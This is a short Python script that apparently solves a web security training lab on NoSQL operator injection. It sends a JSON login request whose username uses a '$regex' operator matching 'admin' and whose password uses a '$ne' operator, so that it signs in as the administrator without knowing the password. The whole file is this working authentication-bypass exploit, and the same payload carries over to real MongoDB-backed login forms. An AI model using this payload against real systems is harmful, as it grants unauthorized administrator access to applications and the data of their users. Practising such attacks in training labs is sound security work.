#!/usr/bin/env python3
import argparse
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

def log_in_as_administrator(session: requests.Session, base_url: str):

    login_url = urljoin(base_url, "/login")
    data = {
        "username": {"$regex":"admin.*"},
        "password": {"$ne":""}
    }

    r = session.post(login_url, json=data, timeout=10)  # Be careful json=data not data=data
    r.raise_for_status()

def main():
    parser = argparse.ArgumentParser(
        description="Lab: Exploiting NoSQL operator injection to bypass authentication"
    )
    parser.add_argument("base_url", help="Base URL of the lab.")
    parser.add_argument("--user", default="wiener")
    parser.add_argument("--password", default="peter")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    sess = requests.Session()

    print("[*] Logging in as administrator...")
    log_in_as_administrator(sess, base_url)
    print("[+] Exploit payload sent. Now checkout in the browser to complete the lab.")


if __name__ == "__main__":
    main()